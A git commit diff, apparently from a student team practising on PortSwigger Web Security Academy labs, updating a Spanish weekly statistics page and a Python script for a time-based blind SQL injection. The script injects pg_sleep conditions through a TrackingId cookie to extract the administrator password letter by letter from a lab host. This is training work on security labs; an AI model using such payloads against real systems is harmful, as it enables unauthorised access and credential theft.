fd0506b3ad9dd7389ce93a5fa5f4d3031d9c7d51
Daniel Mena <omenaf@uni.pe>
2021-03-08 20:58:15 -0500

    actualizar estadisticas

--- PATH/estadisticas.md
+++ PATH/estadisticas.md
@@ -1,13 +1,16 @@
 # Estadisticas por miembro
+## Semana 3
+
+![semana3](semana3_Ejercicios_totales_y_firstblood.png)
 
 ## Semana 2
 
-![semana2](semana2_Ejerciciostatales_y_firstblood.png)
+![semana2](semana2_Ejercicios_totales_y_firstblood.png)
 
 ## Semana 1
 
 ![semana1_Puntaje_acumulado y de la semana.png](semana1_Puntaje_acumulado y de la semana.png)
 
-![semana1_Ejerciciostatales_y_firstblood.png](semana1_Ejerciciostatales_y_firstblood.png)
+![semana1_Ejerciciostatales_y_firstblood.png](semana1_Ejercicios_totales_y_firstblood.png)
 
-Actualizado 4 de marzo de 2021 7:31 pm
+Actualizado 8 de marzo de 2021 8:57 pm
--- Port-Swigger/sql13.py
+++ Port-Swigger/sql13.py
@@ -8,9 +8,12 @@ for p in range(20):
     for a in abc:
     # a = 'a'
     # p = 1
-        r = s.get('https://ac5f1fc91ecfbac98061023900b3006f.web-security-academy.net/', cookies={"TrackingId":"RE5nOMS1F6G2m06C'%3B SELECT CASE WHEN ('"+a+"'=SUBSTRING(password,"+str(p+1)+",1)) THEN pg_sleep(2) ELSE pg_sleep(0) END from users where username='administrator'--", "session":"0iw1Ot3SXZodtYvilWtYeuySiejt9iW6"})
-        print(a, p, r.elapsed.total_seconds(), "password =", password)
-        if r.elapsed.total_seconds() > 2 :
+        r = s.get('https://ac121fdb1e353eb580993b7f00c900a8.web-security-academy.net/', cookies={"TrackingId":"TIM9NdKmwTUJUYxT'%3B SELECT CASE WHEN ('"+a+"'=SUBSTRING(password,"+str(p+1)+",1)) THEN pg_sleep(3) ELSE pg_sleep(0) END from users where username='administrator'--", "session":"0iw1Ot3SXZodtYvilWtYeuySiejt9iW6"})
+        print("password =", password, "|", (p+1),r.elapsed.total_seconds(), a, end =" ")
+        if r.elapsed.total_seconds() > 3 :
+            print("[+]")
             password += a
             break
-
+        else:
+            print("[X]")
+print (password)
